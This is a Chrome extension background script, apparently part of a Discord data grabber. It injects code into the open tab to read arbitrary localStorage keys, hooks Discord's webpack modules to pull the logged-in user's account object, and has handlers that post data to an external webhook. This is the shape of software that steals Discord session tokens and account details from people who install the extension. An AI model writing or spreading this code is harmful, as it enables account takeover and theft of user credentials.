chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (!message) return;

  const { type, data } = message;
  const webhook = require('../config').webhookUrl;

  (async () => {
    if (type === 'SEND_TO_WEBHOOK') {
      const request = await fetch(`${webhook}?wait=true`, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' }
      });
      const json = await request.json();
      sendResponse(json);
    } else if (type === 'GET_WEBHOOK_MESSAGE') {
      const request = await fetch(`${webhook}/messages/${data}`);
      const json = await request.json();
      sendResponse(json);
    } else if (type === 'EDIT_WEBHOOK_MESSAGE') {
      if (!data || !data.messageId || !data.data) return;
      const request = await fetch(`${webhook}/messages/${data.messageId}`, {
        method: 'PATCH',
        body: JSON.stringify(data.data),
        headers: {
          'Content-Type': 'application/json'
        }
      });
      const json = await request.json();
      sendResponse(json);
    } else if (type === 'LOCAL_STORAGE_ITEM') {
      if (!sender.tab) return;
      const [script] = await chrome.scripting.executeScript({
        target: { tabId: sender.tab.id },
        func: (data) => localStorage.getItem(data),
        world: 'MAIN',
        injectImmediately: true,
        args: [data]
      });
      sendResponse({
        response: script.result
      });
    } else if (type === 'DISCORD_USER_INFO') {
      if (!sender.tab) return;
      const [script] = await chrome.scripting.executeScript({
        target: { tabId: sender.tab.id },
        func: async () => {
          await new Promise(r => setTimeout(r, 500));
          let res;
          window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
            for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
              if (m.default && m.default.getCurrentUser !== undefined) res = m.default.getCurrentUser();
            }
          }]);
          await new Promise(r => setTimeout(r, 50));
          return res;
        },
        world: 'MAIN'
      });
      sendResponse(script.result);
    }
  })();

  return true;
});
